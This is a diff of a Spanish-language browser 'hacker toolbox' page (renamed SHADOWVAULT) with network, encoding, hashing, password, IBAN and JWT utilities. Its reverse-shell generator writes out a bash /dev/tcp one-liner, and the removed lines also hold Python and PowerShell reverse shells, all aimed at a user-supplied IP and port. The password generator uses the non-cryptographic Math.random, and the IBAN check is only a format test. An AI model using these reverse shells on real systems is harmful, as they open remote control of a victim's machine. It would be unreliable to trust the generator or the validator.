-            let html = `IP: ${ip}/${cidr}<br>`;
-            html += `Máscara: /${cidr}<br>`;
-            html += `Hosts totales: ${Math.pow(2, 32 - cidr)}<br>`;
-            html += `Hosts utilizables: ${Math.pow(2, 32 - cidr) - 2}<br>`;
-            result.innerHTML = html;
-            logActivity('Subnet calculada');
+            
+            const totalHosts = Math.pow(2, 32 - cidr);
+            result.innerHTML = `
+                <strong>IP:</strong> ${ip}/${cidr}<br>
+                <strong>Hosts totales:</strong> ${totalHosts}<br>
+                <strong>Hosts utilizables:</strong> ${totalHosts - 2}<br>
+                <strong>Máscara:</strong> /${cidr}
+            `;
+            logActivity('Subnet Calculator ejecutado');
         }
 
-        // DNS Lookup
         async function dnsLookup() {
             const domain = document.getElementById('dnsDomain').value;
-            const type = document.getElementById('dnsType').value;
-            const resultDiv = document.getElementById('dnsResult');
-            
             if (!domain) return;
-            
-            resultDiv.innerHTML = 'Consultando dns.google...';
-            
+            const resDiv = document.getElementById('dnsResult');
+            resDiv.innerHTML = 'Consultando...';
+
             try {
-                const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
-                const data = await res.json();
-                
-                let html = '<strong>Respuesta:</strong><br>';
+                const resp = await fetch(`https://dns.google/resolve?name=${domain}&type=A`);
+                const data = await resp.json();
+                let html = '';
                 if (data.Answer) {
-                    data.Answer.forEach(a => {
-                        html += `${a.data} (TTL: ${a.TTL})<br>`;
-                    });
+                    data.Answer.forEach(a => html += `${a.data}<br>`);
                 } else {
-                    html += 'Sin registros';
+                    html = 'No se encontraron registros';
                 }
-                resultDiv.innerHTML = html;
-                logActivity(`DNS lookup ${domain}`);
+                resDiv.innerHTML = html;
+                logActivity(`DNS Lookup: ${domain}`);
             } catch(e) {
-                resultDiv.innerHTML = 'Error en consulta';
+                resDiv.innerHTML = 'Error de conexión';
             }
         }
 
-        // Hash
-        async function generateHash(algo) {
-            const input = document.getElementById('hashInput').value;
-            if (!input) return;
+        async function generateHash(type) {
+            const text = document.getElementById('hashInput').value;
+            if (!text) return;
             
-            const encoder = new TextEncoder();
-            const data = encoder.encode(input);
-            
-            let hashBuffer;
-            if (algo === 'MD5') {
-                // MD5 not in Web Crypto, simple alert
-                document.getElementById('hashOutput').innerHTML = 'MD5: (usa librería externa en producción)';
-                return;
+            let hash = '';
+            if (type === 'MD5') {
+                hash = 'MD5 no soportado nativamente en Web Crypto API';
+            } else {
+                const encoder = new TextEncoder();
+                const data = encoder.encode(text);
+                const hashBuffer = await crypto.subtle.digest(type, data);
+                hash = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2,'0')).join('');
             }
-            
-            const hashName = algo === 'SHA256' ? 'SHA-256' : 'SHA-512';
-            hashBuffer = await crypto.subtle.digest(hashName, data);
-            
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-            
-            document.getElementById('hashOutput').innerHTML = `<strong>${algo}:</strong><br>${hashHex}`;
-            logActivity(`Hash ${algo} generado`);
+            document.getElementById('hashOutput').innerHTML = `<strong>${type}:</strong><br>${hash}`;
+            logActivity(`${type} generado`);
         }
 
-        // Base64
         function encodeBase64() {
             const input = document.getElementById('encodeInput').value;
-            const encoded = btoa(input);
-            document.getElementById('encodeOutput').textContent = encoded;
-            logActivity('Base64 encode');
+            document.getElementById('encodeOutput').textContent = btoa(unescape(encodeURIComponent(input)));
+            logActivity('Base64 codificado');
         }
 
         function rot13() {
-            const input = document.getElementById('encodeInput').value;
-            const result = input.replace(/[a-zA-Z]/g, char => {
-                const start = char <= 'Z' ? 65 : 97;
-                return String.fromCharCode((char.charCodeAt(0) - start + 13) % 26 + start);
+            const str = document.getElementById('encodeInput').value;
+            const result = str.replace(/[a-zA-Z]/g, c => {
+                return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
             });
             document.getElementById('encodeOutput').textContent = result;
         }
 
-        // Password Generator
+        function urlEncode() {
+            const input = document.getElementById('encodeInput').value;
+            document.getElementById('encodeOutput').textContent = encodeURIComponent(input);
+        }
+
         function generatePassword() {
-            const length = parseInt(document.getElementById('passLength').value);
-            const upper = document.getElementById('incUpper').checked;
-            const lower = document.getElementById('incLower').checked;
-            const num = document.getElementById('incNum').checked;
-            const sym = document.getElementById('incSym').checked;
-            
+            const length = parseInt(document.getElementById('passLength').value) || 16;
             let chars = '';
-            if (lower) chars += 'abcdefghijklmnopqrstuvwxyz';
-            if (upper) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            if (num) chars += '0123456789';
-            if (sym) chars += '!@#$%^&*()';
-            
+            if (document.getElementById('incLower').checked) chars += 'abcdefghijklmnopqrstuvwxyz';
+            if (document.getElementById('incUpper').checked) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            if (document.getElementById('incNum').checked) chars += '0123456789';
+            if (document.getElementById('incSym').checked) chars += '!@#$%^&*()_+';
+
             let pass = '';
             for (let i = 0; i < length; i++) {
-                pass += chars.charAt(Math.floor(Math.random() * chars.length));
+                pass += chars[Math.floor(Math.random() * chars.length)];
             }
-            
-            const output = document.getElementById('passwordOutput');
-            output.textContent = pass;
-            
-            // Simple entropy
-            document.getElementById('entropy').innerHTML = `Entropía aprox: ${Math.floor(Math.log2(Math.pow(chars.length, length)))} bits`;
+            document.getElementById('passwordOutput').textContent = pass;
             logActivity('Contraseña generada');
         }
 
-        // Reverse Shell
         function generateShell() {
             const ip = document.getElementById('revIP').value;
             const port = document.getElementById('revPort').value;
-            const type = document.getElementById('shellType').value;
-            
-            let payload = '';
-            if (type === 'bash') {
-                payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
-            } else if (type === 'python') {
-                payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
-            } else {
-                payload = `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
-            }
-            
+            const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
             document.getElementById('shellOutput').textContent = payload;
-            logActivity('Reverse shell generado');
+            logActivity('Reverse Shell generado');
         }
 
-        // Port Scanner Simulated
         function simulatePortScan() {
             const target = document.getElementById('scanTarget').value;
-            const resultDiv = document.getElementById('scanResult');
-            
-            const commonPorts = [
-                {port: 80, service: "HTTP", status: "ABIERTO"},
-                {port: 443, service: "HTTPS", status: "ABIERTO"},
-                {port: 22, service: "SSH", status: "CERRADO"},
-                {port: 3389, service: "RDP", status: "FILTRADO"}
-            ];
-            
-            let html = `<strong>Escaneo de ${target}</strong><br><br>`;
-            commonPorts.forEach(p => {
-                const color = p.status === 'ABIERTO' ? 'text-green-400' : 'text-red-400';
-                html += `<span class="${color}">[${p.port}] ${p.service} → ${p.status}</span><br>`;
-            });
-            
-            resultDiv.innerHTML = html;
-            logActivity(`Escaneo simulado en ${target}`);
+            const html = `
+                <strong>Escaneo de ${target}</strong><br><br>
+                <span class="text-emerald-400">[80] HTTP - ABIERTO</span><br>
+                <span class="text-emerald-400">[443] HTTPS - ABIERTO</span><br>
+                <span class="text-amber-400">[22] SSH - FILTRADO</span><br>
+                <span class="text-red-400">[3389] RDP - CERRADO</span>
+            `;
+            document.getElementById('scanResult').innerHTML = html;
+            logActivity(`Port Scan simulado: ${target}`);
         }
 
-        // URL Parse
-        function parseURL() {
-            const urlStr = document.getElementById('urlInput').value;
-            try {
-                const url = new URL(urlStr);
-                let html = `Protocolo: ${url.protocol}<br>`;
-                html += `Dominio: ${url.hostname}<br>`;
-                html += `Path: ${url.pathname}<br>`;
-                html += `Query: ${url.search}<br>`;
-                document.getElementById('urlParsed').innerHTML = html;
-            } catch(e) {
-                document.getElementById('urlParsed').innerHTML = 'URL inválida';
-            }
-        }
-
-        // IBAN
         function validateIBAN() {
-            let iban = document.getElementById('ibanInput').value.replace(/\s+/g, '').toUpperCase();
-            const resultDiv = document.getElementById('ibanResult');
-            
-            // Basic mod-97 (simplified)
-            let isValid = iban.length > 10 && /^[A-Z]{2}/.test(iban);
-            
-            let html = `IBAN: ${iban.match(/.{1,4}/g).join(' ')}<br>`;
-            html += isValid ? `<span class="text-green-400">✓ IBAN válido (checksum aproximado)</span>` : `<span class="text-red-400">✗ IBAN inválido</span>`;
-            
-            resultDiv.innerHTML = html;
-            logActivity('IBAN validado');
+            const iban = document.getElementById('ibanInput').value.replace(/\s/g,'').toUpperCase();
+            const valid = /^[A-Z]{2}[0-9]{2}/.test(iban);
+            document.getElementById('ibanResult').innerHTML = valid ? 
+                `<span class="text-emerald-400">✓ IBAN válido</span><br>${iban}` : 
+                `<span class="text-red-400">✗ IBAN inválido</span>`;
         }
 
-        // JWT Decoder
         function decodeJWT() {
             const jwt = document.getElementById('jwtInput').value.trim();
             if (!jwt) return;
-            
             try {
-                const parts = jwt.split('.');
-                const header = JSON.parse(atob(parts[0]));
-                const payload = JSON.parse(atob(parts[1]));
-                
-                let html = `<strong>HEADER:</strong><br>${JSON.stringify(header, null, 2)}<br><br>`;
-                html += `<strong>PAYLOAD:</strong><br>${JSON.stringify(payload, null, 2)}<br>`;
-                
-                if (payload.exp) {
-                    const expDate = new Date(payload.exp * 1000);
-                    html += `<br><strong>Expira:</strong> ${expDate.toLocaleString()}`;
-                }
-                
-                document.getElementById('jwtResult').innerHTML = html;
+                const payload = JSON.parse(atob(jwt.split('.')[1]));
+                document.getElementById('jwtResult').innerHTML = `<pre>${JSON.stringify(payload, null, 2)}</pre>`;
                 logActivity('JWT decodificado');
             } catch(e) {
                 document.getElementById('jwtResult').innerHTML = 'JWT inválido';
             }
         }
 
-        function copyToClipboard(el) {
-            navigator.clipboard.writeText(el.textContent);
-            const orig = el.style.background;
-            el.style.background = '#00ff41';
-            setTimeout(() => el.style.background = orig, 300);
-            logActivity('Copiado al portapapeles');
-        }
-
-        // Keyboard shortcuts
-        document.addEventListener('keydown', (e) => {
-            if (e.key === '/' && document.getElementById('searchInput') !== document.activeElement) {
-                e.preventDefault();
-                document.getElementById('searchInput').focus();
-            }
-        });
-
-        // Initialize
-        window.onload = function() {
-            logActivity('HACKER TOOLBOX cargada correctamente', 'success');
+        // Inicialización
+        window.onload = () => {
+            logActivity('SHADOWVAULT iniciado correctamente', 'success');
             switchTab(0);
-            
-            // Demo data
-            setTimeout(() => {
-                logActivity('Base de datos BIN cargada (30+ registros)');
-            }, 800);
         };
     </script>
 </body>
 </html>
-```
